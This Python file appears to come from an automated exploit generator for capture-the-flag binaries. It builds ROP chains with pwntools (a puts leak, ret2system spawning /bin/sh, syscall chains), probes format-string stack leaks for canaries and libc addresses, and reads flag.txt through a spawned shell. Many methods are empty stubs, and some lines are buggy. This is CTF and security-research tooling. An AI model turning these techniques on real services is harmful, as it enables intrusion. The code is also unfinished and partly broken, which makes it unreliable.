import logging
import r2pipe
import binaryninja as bn

from pwn import *
from binascii import *
from rage.machine import Machine
from rage.log import aegis_log

class Against:
    """Class for dealing with exploiting the binary."""

    def __init__(self, binary_path, libc, machine: Machine, ip, port):
        """Create the against class."""

        context.update(
            arch = "amd64",
            endian = "little",
            log_level = "CRITICAL",
            os = "linux"
        )

        self.binary = binary_path
        self.elf = ELF(self.binary)
        self.libc_path = libc
        self.libc = libc
        self.machine = machine
        self.ip = ip
        self.port = port

        self.flag = None
        self.flag_format = "flag"

        self.libc_offset_string = b""
        self.canary_offset_string = b""
        self.format_write_string = b""
        
        self.padding = None
        self.exploit = None

    def start(self, option):
        """Return the running process to a binary."""
        gs = """
            init-pwndbg
            set context-section disasm regs stack
            b main
        """

        if option == "REMOTE":
            return remote(self.ip, self.port)
        elif option == "GDB":
            return gdb.debug(self.binary, gdbscript=gs)
        else:
            return process(self.binary)

    def rop_chain_write_string(self, string, writable_address):
        """Return a rop chain to write a string into the binary."""
        chain = b""

        write_gadget = self.machine.find_write_gadget()
        aegis_log.info(f"Using write gadget {write_gadget}")
        write_gadget_address = int(write_gadget[0].split(b":")[0],16)

        reg_params = self.machine.reg_args 


        return chain

    def rop_chain_syscall(self, parameters):
        """Return a rop chain to call a function with the specific parameters."""
        chain = b""

        reg_params = self.machine.sys_reg_args
        print(reg_params)


        if len(parameters) > 0:
            for i in range(len(parameters)):
                reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
                if reg_gadgets != None:
                    for reg_gadget_str in reg_gadgets:
                        reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
                        chain += reg_gadget + p64(parameters[i])
                        instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                        for inst in instructions:
                            if b"pop" in inst:
                                reg = inst.strip(b" ").split(b" ")[1]
                                if reg.decode("utf-8") in reg_params:
                                    index = reg_params.index(reg.decode("utf-8"))
                                    chain += p64(parameters[index])
                                else:
                                    chain += p64(0)

                            elif b"add rsp" in inst:
                                value = int(inst.split(b",")[1].strip(), 16)
                                chain += p64(0) * (value / 8)
        
            rop = ROP(self.elf)
            chain += p64(rop.find_gadget(["syscall", "ret"])[0])

        return chain



    def rop_chain_call_function(self, function, parameters):
        """Return a rop chain to call a function with the specific parameters."""
        chain = b""

        reg_params = self.machine.reg_args

        if len(parameters) > 0:
            for i in range(len(parameters)):
                reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
                if reg_gadgets != None:
                    for reg_gadget_str in reg_gadgets:
                        reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
                        chain += reg_gadget + p64(parameters[i])
                        instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                        for inst in instructions:
                            if b"pop" in inst:
                                reg = inst.strip(b" ").split(b" ")[1]
                                if reg.decode("utf-8") in reg_params:
                                    index = reg_params.index(reg.decode("utf-8"))
                                    chain += p64(parameters[index])
                                else:
                                    chain += p64(0)

                            elif b"add rsp" in inst:
                                value = int(inst.split(b",")[1].strip(), 16)
                                chain += p64(0) * (value / 8)
        
            chain += p64(self.elf.sym[function])

        return chain

    def rop_ret2puts(self):
        """Return a rop chain that prints out a got address for a function."""
        chain = b""

        leak_function = self.machine.find_functions(["puts", "printf"])[0]
        leak_gadget = int(self.machine.find_reg_gadget("rdi")[0].split(b":")[0].strip(), 16)

        got_function = self.elf.got[leak_function]
        plt_function = self.elf.plt[leak_function]
        main = self.elf.sym["main"]

        chain += p64(leak_gadget) + p64(got_function) + p64(plt_function)
        chain += p64(main)

        aegis_log.info(f"Setting up libc leak with {leak_function}")

        return chain 

    def rop_chain_libc(self, libc_base):
        """Return a ROP chain for ret2system in libc."""
        chain = b""

        r = ROP(self.libc)
        system = p64(self.libc.sym["system"] + libc_base)
        pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
        ret = p64(u64(pop_rdi) + 1)
        binsh = p64(next(self.libc.search(b"/bin/sh\x00")))

        chain += pop_rdi + binsh + system

        return chain

    def rop_chain_srop_exec(self):
        """Return a SROP chain to execute system("/bin/sh")."""
        chain = b""
        return chain

    def rop_chain_srop_read(self):
        """Return a SROP chain to read in "/bin/sh"."""
        chain = b""
        return chain

    def rop_chain_dlresolve(self):
        """Return a chain that dlresolves system."""
        chain = b""
        return chain

    def rop_chain_open(self, file):
        """Return a rop chain that opens a specific file."""
        chain = b""
        return chain

    def rop_chain_read(self, writable_memory, fd, size):
        """Return a rop chain that reads in the writable memory."""
        chain = b""
        return chain

    def rop_chain_write(self, writable_memory, fd, size):
        """Return a rop chain that writes from writable memory into fd."""
        chain = b""
        return chain

    def generate_rop_chain(self):
        """Return the entire rop chain."""
        chain = b""
        return chain

    def format_leak(self):
        """Return the offset string for the format leak."""
        start_end = [0,0]
        stack_len = 100
        string = ""

        # Run the process for stack len amount of times
        # leak the entire stack.
        for i in range(1, stack_len):
            p = process(self.binary)
            offset_str = "%" + str(i) + "$p."
            p.sendline(bytes(offset_str, "utf-8"))
            # !TODO Change >>> to find input
            p.recvuntil(b">>>")

            try:
                p.recvuntil(b": ")
                response = p.recvline().strip().split(b".")
                if response[0].decode() != "(nil)":
                    address = response[0].decode()
                    response = response[0].strip(b"0x")

                    canary = re.search(r"0x[a-f0-9]{14}00", address)

                    if canary and self.machine.canary:
                        self.canary_offset_string = offset_str
                        aegis_log.info(f"Found canary leak at offset {i}: {address}")

                    libc_leak = re.search(r"0x7f[a-f0-9]+34a")

                    if libc_leak:
                        self.libc_offset_string = offset_str.split(".")[0]
                        aegis_log.info(f"Found libc leak at offset {i} with {address}")

                    try:
                        flag = unhexlify(response)[::-1]

                        if self.flag_format in flag.decode() and start_end[0] == 0:
                            string += flag.decode()
                            start_end[0] = 1
                        elif start_end[0] == 1 and "}" in flag.decode():
                            string += flag.decode()
                            self.flag = string
                            break
                        elif start_end[0] == 1 and "}" not in flag.decode():
                            string += flag.decode()
                        elif "}" in flag.decode() and start_end[1] == 0:
                            string += flag.decode()
                            self.flag = string
                            break
                    except:
                        p.close()
                    p.close()
            except:
                p.close()
            p.close()

    def format_write(self, value, addr):
        """Return a format write string payload."""
        return None

    def send_exploit(self, process, exploit):
        """Send the exploit that was generated."""
        return None

    def verify_flag(self, process):
        """Return whether the exploit worked or didn't."""
        return None

    def recieve_flag(self, process):
        """Return the flag after parsing it from the binary."""
        process.sendline(b"cat flag.txt")
        try:
            output = process.recvall(timeout=2)
            if b"{" in output and b"}":
                self.flag = b"{" + output.split(b"{")[1].replace(b" ", b"")
                self.flag = self.flag.replace(b"\n", b"").split(b"}")[0] + b"}"
                self.flag = self.flag.decode()
                return 1
        except EOFError:
            return -1
